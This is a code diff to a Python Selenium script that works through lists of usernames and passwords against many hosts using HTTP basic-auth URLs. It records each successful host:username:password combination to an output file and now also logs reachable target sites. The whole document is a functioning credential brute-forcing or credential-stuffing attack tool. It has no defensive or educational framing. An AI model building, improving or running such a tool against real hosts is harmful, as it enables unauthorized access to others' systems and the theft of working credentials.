@@ -7,6 +7,7 @@ from dataclasses import dataclass
 from pathlib import Path
 from threading import Lock, Thread
 from typing import Deque, List, Optional, Tuple
+from urllib.parse import urlsplit, urlunsplit
 
 from selenium import webdriver
 from selenium.common.exceptions import NoAlertPresentException, TimeoutException, WebDriverException
@@ -19,6 +20,7 @@ from selenium.webdriver.support.ui import WebDriverWait
 
 
 DEFAULT_ATTEMPTS = 3
+TARGET_FILE = Path("sites_target.txt")
 LOGIN_TEXT = "auth"
 
 
@@ -33,6 +35,10 @@ class HostEntry:
     @property
     def is_exhausted(self) -> bool:
         return self.attempts <= 0
+
+    @property
+    def has_protocol(self) -> bool:
+        return self.address.startswith("http://") or self.address.startswith("https://")
 
 
 @dataclass
@@ -49,9 +55,11 @@ class AutomationContext:
     browser: str
     credential_queue: Deque[CredentialEntry]
     credential_lock: Lock
+    file_lock: Lock
     host_lock: Lock
     hosts: Deque[HostEntry]
     output_file: Path
+    target_file: Path
     multiwindow: int
 
 
@@ -64,6 +72,14 @@ class LoginOutcome:
 def log_line(message: str) -> None:
     timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     print(f"[{timestamp}] {message}")
+
+
+def record_target_site(path: Path, lock: Lock, url: str) -> None:
+    normalized = url.rstrip("/") or url
+    path.parent.mkdir(parents=True, exist_ok=True)
+    with lock:
+        with path.open("a", encoding="utf-8") as handle:
+            handle.write(f"{normalized}\n")
 
 
 def parse_file_lines(path: Path, separator: str) -> List[Tuple[str, str]]:
@@ -94,6 +110,20 @@ def parse_single_column(path: Path) -> List[str]:
             if value:
                 entries.append(value)
     return entries
+
+
+def parse_host_entries(path: Path) -> Deque[HostEntry]:
+    if not path.exists():
+        raise FileNotFoundError(f"File not found: {path}")
+
+    hosts: Deque[HostEntry] = deque()
+    with path.open("r", encoding="utf-8") as handle:
+        for raw in handle:
+            line = raw.strip()
+            if not line:
+                continue
+            hosts.append(HostEntry(address=line.rstrip("/")))
+    return hosts
 
 
 def create_driver(browser: str) -> webdriver.Remote:
@@ -132,17 +162,36 @@ def try_load(driver: webdriver.Remote, base: str) -> bool:
     return wait_for_page(driver)
 
 
-def determine_protocol_order(driver: webdriver.Remote, host: HostEntry) -> Optional[List[str]]:
-    attempts_left = DEFAULT_ATTEMPTS
-    while attempts_left > 0:
-        available: List[str] = []
+def build_auth_url(host: HostEntry, credential: CredentialEntry, protocol: str) -> str:
+    if host.has_protocol:
+        parts = urlsplit(host.address)
+        netloc = f"{credential.username}:{credential.password}@{parts.netloc}"
+        return urlunsplit((parts.scheme, netloc, parts.path, parts.query, parts.fragment))
+    return f"{protocol}://{credential.username}:{credential.password}@{host.address}"
 
+
+def determine_protocol_order(
+    ctx: AutomationContext, driver: webdriver.Remote, host: HostEntry
+) -> Optional[List[str]]:
+    if host.has_protocol:
+        scheme = urlsplit(host.address).scheme
+        record_target_site(ctx.target_file, ctx.file_lock, host.address)
+        return [scheme]
+
+    attempts_left = DEFAULT_ATTEMPTS
+    available: List[str] = []
+
+    while attempts_left > 0 and not available:
         if try_load(driver, f"http://{host.address}"):
             available.append("http")
         if try_load(driver, f"https://{host.address}"):
             available.append("https")
 
         if available:
+            for protocol in available:
+                record_target_site(
+                    ctx.target_file, ctx.file_lock, f"{protocol}://{host.address}"
+                )
             if available[0] == "http":
                 return ["http", "https"]
             return ["https", "http"]
@@ -220,7 +269,7 @@ def process_host(ctx: AutomationContext, host: HostEntry) -> None:
     try:
         driver = create_driver(ctx.browser)
 
-        protocol_order = determine_protocol_order(driver, host)
+        protocol_order = determine_protocol_order(ctx, driver, host)
 
         if not protocol_order:
             host.attempts = 0
@@ -240,7 +289,7 @@ def process_host(ctx: AutomationContext, host: HostEntry) -> None:
             outcome = LoginOutcome.FAIL
 
             for protocol in protocol_order:
-                auth_url = f"{protocol}://{credential.username}:{credential.password}@{host.address}"
+                auth_url = build_auth_url(host, credential, protocol)
 
                 if not try_load(driver, auth_url):
                     last_reason = f"connection via {protocol}"
@@ -261,8 +310,11 @@ def process_host(ctx: AutomationContext, host: HostEntry) -> None:
                 outcome = perform_login_flow(driver, credential)
                 if outcome == LoginOutcome.SUCCESS:
                     ctx.output_file.parent.mkdir(parents=True, exist_ok=True)
-                    with ctx.output_file.open("a", encoding="utf-8") as handle:
-                        handle.write(f"{host.address}:{credential.username}:{credential.password}\n")
+                    with ctx.file_lock:
+                        with ctx.output_file.open("a", encoding="utf-8") as handle:
+                            handle.write(
+                                f"{host.address}:{credential.username}:{credential.password}\n"
+                            )
                     log_line(
                         f"[{host.address}] [{credential.username}:{credential.password}] "
                         f"[Success] ({protocol})"
@@ -312,8 +364,7 @@ def worker(ctx: AutomationContext) -> None:
 
 
 def build_context(args: argparse.Namespace) -> AutomationContext:
-    host_pairs = parse_file_lines(Path(args.host_file), ":")
-    hosts = deque(HostEntry(address=f"{ip}:{port}") for ip, port in host_pairs)
+    hosts = parse_host_entries(Path(args.host_file))
 
     if args.credential_file:
         credential_pairs = parse_file_lines(Path(args.credential_file), ";")
@@ -337,9 +388,11 @@ def build_context(args: argparse.Namespace) -> AutomationContext:
         browser=args.browser,
         credential_queue=credential_queue,
         credential_lock=Lock(),
+        file_lock=Lock(),
         host_lock=Lock(),
         hosts=hosts,
         output_file=Path(args.output),
+        target_file=TARGET_FILE,
         multiwindow=args.multiwindow,
     )
 
@@ -362,7 +415,7 @@ def prompt_for_missing(args: argparse.Namespace) -> None:
                     "Path to credentials file (username;password): "
                 ).strip()
     if not args.host_file:
-        args.host_file = input("Path to hosts file (IP:Port): ").strip()
+        args.host_file = input("Path to hosts file (IP:Port or URLs): ").strip()
     if args.multiwindow is None:
         raw = input("Number of windows: ").strip()
         args.multiwindow = int(raw) if raw else 1
